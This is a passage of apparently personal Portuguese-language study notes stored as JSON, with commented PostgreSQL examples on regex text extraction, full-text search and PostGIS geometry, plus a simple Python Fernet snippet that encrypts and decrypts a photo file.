mostra exemplos de combina\u00e7\u00e3o de express\u00f5es regulares para\ncapture diferentes partes da frase \u201cO jogo come\u00e7a \u00e0s 19h.\n2 de maio de 2019.\u201d"}, "substring() - extrai uma substring de uma string grande": {"categoria": "SQL ", "codigo": "\"4/16/17-4/17/17\n2100-0900 hrs.\n46000 Block Ashmere Sq.\nSterling\nLarceny: The victim reported that a\nbicycle was stolen from their opened\ngarage door during the overnight hours.\nC0170006614\"\n\n\n\n/*\n'\\d{4}' procura uma sequ\u00eancia de 4 d\u00edgitos juntos, consegutivos\n*/\n######################################################\nSELECT \nsubstring('The game starts at 7 p.m. on May 2, 2019.' \n\t\t  from '\\d{4}');\n######################################################\n/*\n'd{1,2} (?:a.m|p.m)' procura 1 ou 2 digitos, \nesse d\u00edgito vir\u00e1 na express\u00e3o em forma de interroga\u00e7\u00e3o\nele pode estar acompanhado de a.m. ou p.m.. O espa\u00e7o\n\u00e9 levado em considera\u00e7\u00e3o\n*/\n######################################################\nSELECT \nsubstring('The game starts at 7 p.m. on May 2, 2019.' \n\t\t  from '\\d{1,2} (?:a.m.|p.m.)');\n######################################################\n/*\n'^\\w+' retorna 1 ou mais caracteres que estejam no\nin\u00edcio da frase, isso significa que ele vai retornar\no The, porque \u00e9 a primeira cadeia de caracteres da\nfrase\n*/\n######################################################\nSELECT \nsubstring('The game starts at 7 p.m. on May 2, 2019.' \n\t\t  from '^\\w+');\n######################################################\n/*\n'\\w+.$' retorna o 1 ou mais caracteres que esteja no final\nda frase seguindo de um ., ou seja, '2019.'\n*/\n######################################################\nSELECT \nsubstring('The game starts at 7 p.m. on May 2, 2019.' \n\t\t  from '\\w+.$');\n######################################################\nSELECT \nsubstring('The game starts at 7 p.m. on May 2, 2019.' \n\t\t  from 'May|Jun');\n\n######################################################\n/*\n'\\d{4}' retorna a \u00faltima cadeia de caracteres \nque no caso \u00e9 constitu\u00eddo de 4 digitos consecutivos\n*/\n\nSELECT \nsubstring('The  game starts  at 7 p.m. on May 2, 2019.' \n\n######################################################\n\n/*\n'May \\d, \\d{4}' \u00e9 a estrutura da frase, \nisso significa que retorna a procura por\nalgo que comece com May tenha 1 digito,\ndepois uma v\u00edrgula, depois espa\u00e7o de uma \ncadeia de 4 d\u00edgitos seguidos consecutivamente\n*/\n\nSELECT \nsubstring('The  game starts  at 7 p.m. on May 2, 2019.' \n\t\t  from 'May \\d, \\d{4}');\n\t\t  from '\\d{4}');\n\n\n######################################################\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, 'pesquisa'), no lugar a substring\npara poder encontrar as datas dentro do texto\n*/\n\nSELECT crime_id,\n\tregexp_match(original_text, '\\d{1,2}\\/\\d{1,2}\\/\\d{2}')\nFROM crime_reports;\n\n\n######################################################\n\n\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_matches(coluna, 'pesquisa', 'g'), \nobserve bem que o macht agora \u00e9 com 'es', pois dessa forma\nconseguimos pegar a segunda data encontrada no texto.\nNa verdade, retornar as datas encontrada por linha,\nse tiver mais dadas aparecer\u00e1 mais linhas na coluna id\n1\t\"{4/16/17}\"\n1\t\"{4/17/17}\"\n*/\nSELECT crime_id,\n\tregexp_matches(original_text, '\\d{1,2}\\/\\d{1,2}\\/\\d{2}', 'g')\nFROM crime_reports;\n\n######################################################\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, 'pesquisa')\nele pesquisa uma da MM/DD/YY por\u00e9m precedida de um\nh\u00edfen '-'.\n\n*/\nSELECT crime_id,\n\tregexp_match(original_text, '-\\d{1,2}\\/\\d{1,2}\\/\\d{2}')\nFROM crime_reports;\n\n######################################################\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, '-(pesquisa)')\nele pesquisa uma da MM/DD/YY por\u00e9m precedida de um\nh\u00edfen '-', por\u00e9m, colocar um H\u00edfen antes dos par\u00eanteses\nprocura da mesma forma, por\u00e9m a sa\u00edda retira esse '-'\nporque, o formato de dados que precisamos \u00e9 o de \ncarimbo hor\\data e com o h\u00edfen ficaria dado inv\u00e1lido\n\n*/\nSELECT crime_id,\n\tregexp_match(original_text, '-(\\d{1,2}\\/\\d{1,2}\\/\\d{2})')\nFROM crime_reports;\n\n\n\n\n\n\n\n######################################################\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, '-----(pesquisa)')\npara encontrarmos a hora do relat\u00f3rio, a parte \\/\\d{2}\nprocura a parte final da data MM/DD/YY, 'YY',\na parte \\n(\\d{4}) diz que tem uma linha de dist\u00e2ncia\ne em seguinda um n\u00famero de 4 d\u00edgitos, o n\u00famero est\u00e1 entre\npar\u00eanteses para ser evidenciado apenas essa parte da pesquisa,\npoder\u00edamos ter usados apenas o '(\\d{4})' que seria achado\nmas as outras especifica\u00e7\u00f5es de pesquisa servem para \ngaratir a opi\u00e7\u00e3o do dado pesquisado\n\n\n*/\nSELECT crime_id,\n\tregexp_match(original_text, '\\/\\d{2}\\n(\\d{4})')\nFROM crime_reports;\n\n\n######################################################\n\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, '-----(pesquisa)')\npara encontrarmos a segunda hora, tem final da primeira\ndata, o formato da primeira hora o h\u00edfen que vem antes\nda segunda hora e a segunda hora entre par\u00eanteses, pois\nessa parte que ser\u00e1 evidenciada\n\n\n*/\nSELECT crime_id,\n\tregexp_match(original_text, '\\/\\d{2}\\n\\d{4}-(\\d{4})')\nFROM crime_reports;\n\n######################################################\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, 'pesquisa')\npara encontrarmos uma frase inteira que corresponde\na rua, procuramos uma estrutura que comece com 'hrs 'e \npule uma linha, em seguida, qualquer digito uma ou mais\nvezes, em seguida qualquer caractere uma ou mais vezes,\nseguido de :a ou b ou c = a|b|c\n\n\\d+ significa 1 ou mais digitos\n.+ significa 1 ou mais caracteres\n?:Sq.|Pz.|Dr.|Ter.|Rd.\n\n*/\nSELECT crime_id,\n\tregexp_matches(original_text, 'hrs.\\n(\\d+ .+(?:Sq.|Plz.|Ter.|Rd.|Dr.))')\nFROM crime_reports;\n\n######################################################\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, 'pesquisa')\npara encontrarmos o nome da rua,\nprimeiro pegamos o padr\u00e3o da linha anterior, \nem seguida saltamos uma linha e procuramos\numa palavra ou duas palavras e salta uma linha\n\n\n*/\nSELECT crime_id,\n\tregexp_matches(original_text, '(?:Sq.|Plz.|Dr.|Ter.|Rd.)\\n(\\w+ \\w+|\\w+)\\n')\nFROM crime_reports;\n\n\n######################################################\n\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, 'pesquisa')\npara encontrar o crime que foi feito, \no (.*) captura toda a linha, \no pesquisado antes \u00e9 \\n(\\w+ \\w+|\\w+)\\n\ne ele pula uma linha e o .* captura toda essa linha\nque vem depois \n\n\n*/\nSELECT crime_id,\n\tregexp_matches(original_text, '\\n(\\w+ \\w+|\\w+)\\n(.*):')\nFROM crime_reports;\n\n######################################################\n\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, 'pesquisa')\npara encontrar a descri\u00e7\u00e3o, ela vem\nde :(doisPontos) seguido de uma espa\u00e7o(\\s) \n(+.) qualquer caracter que aparece uma ou mais\nvezes e acaba no co ou so\n*/\nSELECT crime_id,\n\tregexp_matches(original_text, ':\\s(.+)(?:CO|SO)')\nFROM crime_reports;\n\n######################################################\n\n/*\nAqui estamos extraindo os dados de um texto,\nusamos a fun\u00e7\u00e3o regexp_match(coluna, 'pesquisa')\npara encontrar o c\u00f3digo da ocorr\u00eancia,\nCO ou SO seguindo de um digito seguido um ou mais\ncaracteres\n*/\nSELECT crime_id,\n\tregexp_matches(original_text, '(?:CO|SO)[0-9]+')\nFROM crime_reports;\n\n\n\n######################################################\n\n\nSELECT \nregexp_match(original_text, '(?:C0|SO)[0-9]+') AS case_number, \nregexp_match(original_text, '\\d{1,2}\\/\\d{1,2}\\/\\d{2}') AS date_1, \nregexp_match(original_text, '\\n(?:\\w+ \\w+|\\w+)\\n(.*):') AS crime_type, \nregexp_match(original_text, '(?:Sq.|Plz.|Dr.|Ter.|Rd.)\\n(\\w+ \\w+|\\w+)\\n') \nAS city \nFROM crime_reports; \n\n/* Para extrair os dados do texto\n*/\n\nSELECT \n\t(regexp_match(original_text, '(?:CO|SO)[0-9]+'))[1] AS case_number,\n\t(regexp_match(original_text, '\\d{1,2}\\/\\d{1,2}\\/\\d{2}'))[1] AS date_1,\n\t(regexp_match(original_text, '\\n(?:\\w+ \\w+|\\w+)\\n(.*)'))[1] AS crime_type,\n\t(regexp_match(original_text, '(?:Sq.|Plz.|Dr.|Ter.|Rd.)\\n(\\w+ \\w+|\\w+)\\n'))[1] AS city\nFROM crime_reports;\n\n\n\n######################################################\n\nUPDATE crime_reports\nSET date_1 = \n\t(\n\t\t(regexp_match(original_text, '\\d{1,2}\\/\\d{1,2}\\/\\d{2}'))[1]\n\t\t||' ' ||\n\t\t(regexp_match(original_text, '\\/\\d{2}\\n(\\d{4})'))[1]\n\t\t|| ' US/Eastern'\n\t)::text,\n\t\n\tdate_2 =\n\tCASE\n\t\tWHEN (SELECT regexp_match(original_text, '-(\\d{1,2}\\/\\d{1,2}\\/\\d{1,2})') IS NULL)\n\t\t\tAND (SELECT regexp_match(original_text, '\\/\\d{2}\\n\\d{4}-(\\d{4})') IS NOT NULL)\n\t\n\tTHEN\n\t\t((regexp_match(original_text, '\\d{1,2}\\/\\d{1,2}\\/\\{2}'))[1]\n\t\t || ' '||\n\t\t (regexp_match(original_text, '\\/\\d{2}\\n\\d{4}-(\\d{4})'))[1]\n\t\t ||' US\\Eastern'\n\t\t)::text\n\tWHEN (SELECT regexp_match(original_text, '-(\\d{1,2}\\/\\d{1,2}\\/\\d{1,2})') IS NOT NULL)\n\t\tAND (SELECT regexp_match(original_text, '\\/\\d{2}\\n\\d{4}-(\\d{4})') IS NOT NULL)\n\t\n\tTHEN\n\t\t((regexp_match(original_text, '-(\\d{1,2}\\/\\d{1,2}\\/\\d{1,2})'))[1]\n\t\t\t|| ' '||\n\t\t\t(regexp_match(original_text, '\\/\\d{2}\\n\\d{4}-(\\d{4})'))[1]\n\t\t\t|| ' US/Eastern'\n\t\t)::text\n\tELSE NULL\n\tEND,\n\tstreet = (regexp_match(original_text, 'hrs.\\n(\\d+ .+(?:Sq.|Plz.|Dr.|Ter.|Rd.))'))[1],\n\tcity = (regexp_match(original_text, '(?:Sq.|Plz.|Dr.|Ter.|Rd.)\\n(\\w+ \\w+|\\w+\\n)'))[1],\n\tcrime_type = (regexp_match(original_text, '\\n(?:w+ \\w+|\\w+)\\n(.*):'))[1],\n\tdescription = (regexp_match(original_text, ':\\s(.+)(?:CO|SO)'))[1],\n\tcase_number = (regexp_match(original_text, '(?:CO|SO)[0-9]+'))[1];\n\n\n\n\n######################################################\n\n\n/* Estamos fazendo uma consulta com a coluna\ngeo_name onde tenham cadeias de caracteres\nque que tenham \n.+ caracteres antes\n.+ caracteres depois \ne o lade ou lare no meio\ne o ~* \u00e9 a explress\u00e3o regular que nao diferencia\nmai\u00fasculas de min\u00fasculas\n\n*/\n\nSELECT geo_name\nFROM us_counties_2010\nWHERE geo_name ~*'(.+lade.+|.+lare.+)'\nORDER BY geo_name;\n\n\n\n######################################################\n\n\n/*Aqui estamos fazendo uma consulta\nque filtra os resultados com \n~* '.+ash.+' = palavra que tem ash no meio e\ndesconsidera mai\u00fasculo e min\u00fasculo\n!~ 'Wash.+' = nega\u00e7\u00e3o de palavra que come\u00e7a com Wash, \ne Vai negar de acordo com o formato que foi colocado\nletra mai\u00fascula primeiro\n\n*/\n\nSELECT geo_name\nFROM us_counties_2010\nWHERE geo_name ~* '.+ash.+' AND geo_name !~ 'Wash.+'\nORDER BY geo_name;\n\n######################################################\n\nSELECT regexp_replace('05/12/2018', '\\d{4}', '2017');\n\n\n\n######################################################\n/*Divide as palavras da frase para cada linha,\ncada palavra ser\u00e1 uma linha\n*/\n\nSELECT regexp_split_to_table('Four,score,and,seven,years,ago',',');\n\n\n######################################################\n/*\nO regexp_split_to_array() transforma a frase em uma lista\nde palavras ou de letras e conta quantas palavras ou letras\ntem\n*/\n\nSELECT array_length(regexp_split_to_array('Phil Mike Tony Steve', ' '),1);\n\n\n######################################################\n\n\n\n/* Reduz as palavras da frase para apenas palavras importantes\ne retira os sulfixos, as palavras s\u00e3o ordenas em ordem alfab\u00e9tica\ne seguida de n\u00fameros que s\u00e3o as posi\u00e7\u00f5es dessas palavras nas frases \noriginais\n\n*/\n\nSELECT to_tsvector('I am walking across the sitting room to sit with you.');"}, "concatena\u00e7\u00e3o de string linha 1... a + b": {"codigo": "/* fique atento ao espa\u00e7o que tem nas aspas, se n\u00e3o tiver espa\u00e7o\na string ficar\u00e1 grudada uma na outra\n*/\n\nSELECT \n\t(\n\t\t(regexp_match(original_text, '\\d{1,2}\\/\\d{1,2}\\/\\d{2}'))[1]\n\t\t||' '||\n\t\t(regexp_match(original_text, '\\/\\d{2}\\n(\\d{4})'))[1]\n\t)\nFROM crime_reports;", "categoria": "SQL "}, "to_tsquery (texto)| to_vector(texto) |(texto & texto) + @@ ": {"categoria": "SQL ", "codigo": "/*Nesse codigo usamos o to_tsvector(), ele serve para pegar\nas palvras que tem mais sentido agrup\u00e1-las em um vetor\nque contenha a palavra sem a conjuga\u00e7\u00e3o e em seguida o \nposi\u00e7\u00e3o na frase, logo usamos o to_tsquery() \u00e9 uma consulta\nde texto que \u00e9 transformado em um formato que pode ser comparado\ncom o vetor do to_tsvector(), o @@ verifica se o texto do \nto_tsvequery() corresponde ao vetor do to_tsvector().\nNesse caso \u00e9 falso porque embroa a palavra walk esteja presente\nno vetor, a palavra run n\u00e3o est\u00e1 presenta nem no vetor\npor n\u00e3o est\u00e1 presente no texto original.\n\nps: O & diz que a consulta deve ter a suas palavras\n\n\n\nSELECT to_tsquery('english','walking'); lembre sempre de colocar a lingua \nantes da palavra que quer se transformar em um lexema, caso queria\ntransformar em um. Se n\u00e3o colocar a lingua antes, a palavra n\u00e3o ser\u00e1\ntransformada e vai retornar como exemplo 'walkign'\n*/\n\n\nSELECT to_tsvector('I am walking across the sitting room') @@ \n\tto_tsquery('walking & running');\n\n\n\n\n##########################################################\n/*\nA coluna\n*/\n\nCREATE TABLE president_speeches(\n\tsotu_id serial PRIMARY KEY,\n\tpresident varchar(100) NOT NULL,\n\ttitle varchar(250) NOT NULL,\n\tspeech_date date NOT NULL,\n\tspeech_text text NOT NULL,\n\tsearch_speech_text tsvector\n);\n\n\n##########################################################\n\n/*\nEstamos fazendo um update na tabela president_speeches,\no to_tsvector('english', coluna), faz um vetor de palavras\npara otimizar pesquisas, o diz que o texto deva ser\ntokenizado de acordo com a l\u00edgua inglesa, a respeito dos\nsulfixo, prefixos e parte comum\n\n*/\n\nUPDATE president_speeches\n\tSET search_speech_text = to_tsvector('english', speech_text);\n\n\n\n##########################################################\n\n\n\n\n/*Criamos um INDEZ com o nome de \nsearch_idx na tabela president_speeches\nusando o gin(coluna de vetores de texto(to_tsvextor())),\nele agiliza a busca por em textos completos\n\n*/\n\nCREATE INDEX search_idx ON president_speeches\nUSING gin(search_speech_text);\n\n\n\n##########################################################\n\n\n/*\nEstamos fazendo uma consulta que verifica se\n'around' est\u00e1 dentro do vetor gerado pelo texto\noriginal, e retorna apenas as linhas que est\u00e3o.\n\n*/\n\nSELECT president,\nspeech_date\nFROM president_speeches\nWHERE search_speech_text @@ to_tsquery('around')\nORDER BY speech_date; \n\n\n\n##########################################################\n\n\n\n/*\nEstamos usando a fun\u00e7\u00e3o ts_headline(coluna, to_tsquery('palavra'),\ncom as especifica\u00e7\u00f5es que vem depois, selecionamos\nquantas palavras vem antes e depois da palavra pesquisada, \ncom o search_speech_text @@ to_tsquery('palvra'), \nverifica que a palavra est\u00e1 dentro do texto completo\n*/\nSELECT president,\n\tspeech_date,\n\tts_headline(speech_text, to_tsquery('around'),\n\t\t\t   'StartSel=<,\n\t\t\t\tStopSel=>,\n\t\t\t\tMinWords=5,\n\t\t\t\tMaxWords=7,\n\t\t\t\tMaxFragments=1')\nFROM president_speeches\nWHERE search_speech_text @@ to_tsquery('around');\n\n##########################################################\n\n\nSELECT president,\n\tspeech_date,\n\tts_headline(speech_text, to_tsquery('around & !world'),\n\t\t\t   'StartSel=<,\n\t\t\t\tStopSel=>,\n\t\t\t\tMinWords=5,\n\t\t\t\tMaxWords=7,\n\t\t\t\tMaxFragments=1')\nFROM president_speeches\nWHERE search_speech_text @@ to_tsquery('around & !world');\n\n\n\n##########################################################\nSELECT president,\n\tspeech_date,\n\tts_headline(speech_text, to_tsquery('walking|walk|walked'),\n\t\t\t   'StartSel=<,\n\t\t\t\tStopSel=>,\n\t\t\t\tMinWords=5,\n\t\t\t\tMaxWords=7,\n\t\t\t\tMaxFragments=1')\nFROM president_speeches\nWHERE search_speech_text @@ to_tsquery('english', 'walking');\n\n\n\n##########################################################\n\n\n\n\n/*\nNessa consulta, o ts_headline() procura o consulta do to_tsquery()\nno texto original, dessa forma, a forma de palavra deve ser  a mesma\nom normalizada para que encontre as duas, por no search_speech_text, a \npalavra estar\u00e1 em lexioma(normalizada), assim, pesquisamos no texto\ncomo lexioma e normal, e no search_speech_text() usamos o WHERE\nem conjunto do lexioma, ou seja, ambar normalizadas\n*/\nSELECT president,\n\tspeech_date,\n\tts_headline(speech_text, to_tsquery('transportation|transport & !roads'),\n\t\t\t   'StartSel=<,\n\t\t\t\tStopSel=>,\n\t\t\t\tMinWords=5,\n\t\t\t\tMaxWords=7,\n\t\t\t\tMaxFragments=1')\nFROM president_speeches\nWHERE search_speech_text @@ to_tsquery('english', 'transportation & !roads');\n\n\n##########################################################\n\n\n/*\nEssa consulta procuram palavras que estejam pr\u00f3ximas umas \nas outras, mas n\u00e3o necess\u00e1riamente na mesma ordem, no \nprimeiro to_tsquery(), usamos as plavras iguais ao texto, \npara fazer a busca, ja no to_tsquery() referente ao filtro\nWHERE, usamos o 'english', para poder formar os lexiomas, \nou seja, palavras normais e comparar com a lista de palavras\nnormais do search_speech_text()\n*/\n\nSELECT president,\n\tspeech_date,\n\tts_headline(speech_text, to_tsquery('military <-> defense'),\n\t\t\t   'StartSel = <,\n\t\t\t\tStopSel = >,\n\t\t\t\tMinWords = 5,\n\t\t\t\tMaxWords = 7,\n\t\t\t\tMaxFragments = 1')\nFROM president_speeches\nWHERE search_speech_text @@ to_tsquery('english','military <-> defense');\n\n\n\n##########################################################\n\n\n/*Fazemos uma consulta onde queremos ranquear o discurso\nde acordo com as palavras (war, security, threat, enemy)\no ts_rank() \u00e9 usado na coluna que cont\u00e9m os lexiomas, ele\ncalcula a frequ\u00eancia das palavras e leva em conta a proximidade delas\nao passo que o ts_rank_cd() ranqueia levando em conta apenas\nas franqu\u00eancias das palavras na coluna de lexiomas\n*/\n\nSELECT president,\n\tspeech_date,\n\tts_rank(search_speech_text, to_tsquery('war & security & threat & enemy')) AS score\nFROM president_speeches\nWHERE search_speech_text @@ to_tsquery('english', 'war & security & threat & enemy')\nORDER BY score DESC\nLIMIT 5;\n\n\n##########################################################\n\n/*\nEssa consulta fazemos um rank de relev\u00e2ncia do discurso,\npor\u00e9m, ao colocarmos agora o d\u00edgito 2, depois do to_tsquery, \ninformamos que o ranking agora deve ser levado em considera\u00e7\u00e3o\nal\u00e9m a frequ\u00eancia das palavras e a proximidades delas, o comprimento\ndo texto, j\u00e1 que um texto maior tem mais espa\u00e7o para repetir os\ntermos de par\u00e2metro\n\n*/\n\nSELECT president,\n\tspeech_date,\n\tts_rank(search_speech_text, \n\t\t\tto_tsquery('war & security & threat & enemy'),2)::numeric \n\t\t\tAS score\nFROM president_speeches\nWHERE search_speech_text @@ to_tsquery('english', 'war & security & threat & enemy')\nORDER BY score DESC\nLIMIT 5;"}, "Analise de dados espaciais": {"categoria": "SQL ", "codigo": "--Cria o ambiente para fazermos as nossas an\u00e1lises\nCREATE DATABASE gis_analysis; \n\n\nO PostgreSQL criar\u00e1 o banco de dados gis_an\u00e1lise, que n\u00e3o \u00e9 diferente\ndo que outros que voc\u00ea fez. Para habilitar extens\u00f5es PostGIS nele, siga\nestas etapas:\n1. Feche a guia Ferramenta de consulta.\n2. No navegador de objetos, clique com o bot\u00e3o direito em Bancos de Dados e selecione Atualizar.\n3. Clique no novo banco de dados gis_an\u00e1lise na lista para destac\u00e1-lo.\n4. Abra uma nova guia Ferramenta de consulta selecionando Ferramentas \u25b8 Ferramenta de consulta. O\nO banco de dados gis_an\u00e1lise deve estar listado na parte superior do painel de edi\u00e7\u00e3o.\n5. Na Ferramenta de Consulta, execute o c\u00f3digo da Listagem 14-2.\n\nCREATE EXTENSION postgis;\n\nSELECT postgis_full_version();\n\n\nGeometrias bidimensionais\nPara criar dados espaciais mais complexos, voc\u00ea conecta v\u00e1rios pontos usando\nlinhas. A Organiza\u00e7\u00e3o Internacional de Normaliza\u00e7\u00e3o (ISO) e a\nOpen Geospatial Consortium (OGC) criou um recurso simples\npadr\u00e3o para construir e acessar formas bidimensionais e tridimensionais,\n\u00e0s vezes chamadas de geometrias. PostGIS suporta o padr\u00e3o.\nOs recursos simples mais comumente usados que voc\u00ea encontrar\u00e1 ao\nconsultar ou criar dados espaciais com PostGIS incluem o seguinte:\n\nPonto \nUm \u00fanico local em um plano bidimensional ou tridimensional. Sobre\nmapas, um ponto \u00e9 geralmente representado por um ponto marcando uma longitude e\nlatitude.\n\nLineString\n Dois ou mais pontos conectados por uma linha reta. \nCom LineStrings, voc\u00ea pode representar fei\u00e7\u00f5es como uma estrada, trilha de caminhada ou\nfluxo.\n\nPol\u00edgono \nUma forma bidimensional, como um tri\u00e2ngulo ou um quadrado, que tem\ntr\u00eas ou mais lados retos, cada um constru\u00eddo a partir de um LineString. Em\nan\u00e1lise geogr\u00e1fica, os pol\u00edgonos representam objetos como na\u00e7\u00f5es, estados,\nedif\u00edcios e corpos d'\u00e1gua. Um pol\u00edgono tamb\u00e9m pode ter um ou mais\npol\u00edgonos internos que atuam como furos dentro do pol\u00edgono maior.\n\nMultiPoint \nUm conjunto de pontos. Por exemplo, voc\u00ea pode representar v\u00e1rios\nlocais de um varejista com um \u00fanico objeto MultiPoint que cont\u00e9m\nlatitude e longitude de cada loja.\n\nMultiLineString \nUm conjunto de LineStrings. Voc\u00ea pode representar, por\npor exemplo, um objeto como uma estrada com v\u00e1rios\nsegmentos.\n\nMultiPolygon \nUm conjunto de pol\u00edgonos. Por exemplo, voc\u00ea pode representar um\nparcela de terreno dividida em duas partes por uma estrada: voc\u00ea pode agrupar\ncoloque-os em um objeto MultiPolygon em vez de usar pol\u00edgonos separados.\n\n\nGeometry \nFormat \nNotes \nPoint \nPOINT (-74.9 42.7) \nUm par de coordenadas marcando um\napontar em \u221274,9 longitude e\nLatitude 42,7.\n\n\nLineString \nLINESTRING (-74.9 42.7, -75.1 \n42.7) \nUma linha reta com pontos finais\nmarcado por duas coordenadas\npares.\n\n\nPolygon \nPOLYGON ((-74.9 42.7, -75.1 \n42.7, \n-75.1 42.6, -74.9 42.7)) \nUm tri\u00e2ngulo delimitado por tr\u00eas\ndiferentes pares de coordenadas.\nEmbora listado duas vezes, o primeiro e o \u00faltimo par s\u00e3o iguais\ncoordenadas, fechando a forma.\n\n\nMultiPoint \nMULTIPOINT (-74.9 42.7, -75.1 \n42.7) \nDois pontos, um para cada par\nde coordenadas. \n\n\nMultiLineString MULTILIN\nESTRING ((-76.27 43.1, -76.06 43.08), (-76.2 43.3, -76.2 43.4, -76.4 43.1)) \nDuas LineStrings. O primeiro\ntem dois pontos; o segundo tem\ntr\u00eas.\n\nMultiPolygon \nMULTIPOLYGON (((-74.92 42.7, \n-75.06 42.71, -75.07 42.64, \n-74.92 42.7), (-75.0 42.66, \n-75.0 42.64, -74.98 42.64, \n-74.98 42.66, -75.0 42.66))) \nDois pol\u00edgonos. O primeiro \u00e9 um\ntri\u00e2ngulo, e o segundo \u00e9 um\nret\u00e2ngulo\n"}, "criptografia": {"codigo": "pip install cryptography\n\nfrom cryptography.fernet import Fernet\n\n# Gera uma chave e a salva em um arquivo\ndef generate_key():\n    key = Fernet.generate_key()\n    with open(\"key.key\", \"wb\") as key_file:\n        key_file.write(key)\n\n# Carrega a chave de um arquivo\ndef load_key():\n    return open(\"key.key\", \"rb\").read()\n\n# Encripta um arquivo\ndef encrypt_file(file_name):\n    key = load_key()\n    fernet = Fernet(key)\n\n    with open(file_name, \"rb\") as file:\n        file_data = file.read()\n\n    encrypted_data = fernet.encrypt(file_data)\n\n    with open(file_name, \"wb\") as file:\n        file.write(encrypted_data)\n\n# Gera uma chave\ngenerate_key()\n\n# Encripta a foto (substitua 'photo.jpg' pelo nome do arquivo da sua foto)\nencrypt_file(\"photo.jpg\")\n\n\n\n\n\n\n\n\n\n\n\n\nfrom cryptography.fernet import Fernet\n\n# Carrega a chave de um arquivo\ndef load_key():\n    return open(\"key.key\", \"rb\").read()\n\n# Desencripta um arquivo\ndef decrypt_file(file_name):\n    key = load_key()\n    fernet = Fernet(key)\n\n    with open(file_name, \"rb\") as file:\n        encrypted_data = file.read()\n\n    decrypted_data = fernet.decrypt(encrypted_data)\n\n    with open(file_name, \"wb\") as file:\n        file.write(decrypted_data)\n\n# Desencripta a foto (substitua 'photo.jpg' pelo nome do arquivo da sua foto encriptada)\ndecrypt_file(\"photo.jpg\")\n", "categoria": "Programas exemplos"}, "ST_GeomFromText('', 4326) - coordenadas em texto encodificadas binariamente": {"categoria": "SQL ", "codigo": "/*A fun\u00e7\u00e3o ST_GeogFromText() cria objetos geograpy, isso significa\nque tem uma maior precis\u00e3o, por levar em considera\u00e7\u00e3o a curvatura da terra\npor exemplo, \u00e9 indicado para escalas maiores onde as distor\u00e7\u00f5es fazem\ndiferen\u00e7a,\nj\u00e1 a fun\u00e7\u00e3o ST_GeomFromText() cria objetos geometric, isso significa\nque tem uma menor precis\u00e3o, por n\u00e3o levar em considera\u00e7\u00e3o a curvatura da terra\npor exemplo, \u00e9 indicado para escalas menores onde as ditor\u00e7\u00f5es n\u00e3o \nfazem diferen\u00e7a.\n*/\n\nSELECT ST_GeogFromText('SRID=4326;MULTIPOINT(-74.9 42.7, -75.1 42.7,\n\t\t\t\t\t  -74.924 42.6)')\n####################################################################\n\n\n/*\nAqui temos a fun\u00e7\u00e3o ST_GeomFromText(), ela vai pegar as\ncoordenadas em formato de string(text) e encodificar em \nWKB(well-know binarie), ela precisa que seja especificado \nque seja um ponto(POINT) e as coordenadas em texto, logo em\nseguida preisa saber o tipo de Sistema de refer\u00eancias de \ncoordenadas(SRID) que no caso vai ser o WGS 84, sistema\nmundial geod\u00e9sico de 1984. essa consulta retornar\u00e1 um \nc\u00f3digo que no caso \u00e9 esse  aqui: \n0101000020E61000008EDA0E5718BB52C017BB7D5699594540\n\n01 - \nsignifica ordem dos bits de menos significativos para\nmais significativo.\n010000 -\nsignifica que \u00e9 um ponto.\n0020E610 -\nsignifica que o sistema geod\u00e9sico mundial(WGS84) \u00e9 usado\ncom a entrada de 4336\n8EDA0E5718BB52CO -\nSignifica a primeira coordenada que \u00e9 a longitude em bin\u00e1rio\n17BB7D5699594540-\nSignifica e segunda coordenada que \u00e9 a latitude em bin\u00e1rio\n*/\n\nSELECT ST_GeomFromText('POINT(-74.9233606 42.699992)', 4326);\n\n0101000020E61000008EDA0E5718BB52C017BB7D5699594540\n\n-- Converte o WKB de volta para geometria para verifica\u00e7\u00e3o\nSELECT ST_AsText(ST_GeomFromWKB('\\x0101000020E61000008EDA0E5718BB52C017BB7D5699594540'));\n\nSELECT \nST_GeometryType()\n\n\n\n######################################################################\n\nSELECT ST_GeomFromText('POINT(-74.9233606 42.699992)', 4326);\n\"0101000020E61000008EDA0E5718BB52C017BB7D5699594540\"\n\nSELECT ST_GeomFromText('LINESTRING(-74.9 42.7, -75.1 42.7)', 4326); \n\"0102000020E6100000020000009A99999999B952C09A999999995945406666666666C652C09A99999999594540\"\n\nSELECT ST_GeomFromText('POLYGON((-74.9 42.7, -75.1 42.7, \n-75.1 42.6, -74.9 42.7))', 4326); \n\"0103000020E610000001000000040000009A99999999B952C09A999999995945406666666666C652C09A999999995945406666666666C652C0CDCCCCCCCC4C45409A99999999B952C09A99999999594540\"\n\nSELECT ST_GeomFromText('MULTIPOINT (-74.9 42.7, -75.1 42.7)', 4326); \n\"0104000020E61000000200000001010000009A99999999B952C09A9999999959454001010000006666666666C652C09A99999999594540\"\n\nSELECT ST_GeomFromText('MULTILINESTRING((-76.27 43.1, -76.06 43.08), \n(-76.2 43.3, -76.2 43.4, \n-76.4 43.1))', 4326);\n\"0105000020E610000002000000010200000002000000E17A14AE471153C0CDCCCCCCCC8C4540A4703D0AD70353C00AD7A3703D8A4540010200000003000000CDCCCCCCCC0C53C06666666666A64540CDCCCCCCCC0C53C03333333333B345409A999999991953C0CDCCCCCCCC8C4540\" \n\n\nSELECT ST_GeomFromText('MULTIPOLYGON(((-74.92 42.7, -75.06 42.71, \n-75.07 42.64, -74.92 42.7), \n(-75.0 42.66, -75.0 42.64, \n-74.98 42.64, -74.98 42.66, \n-75.0 42.66)))', 4326); 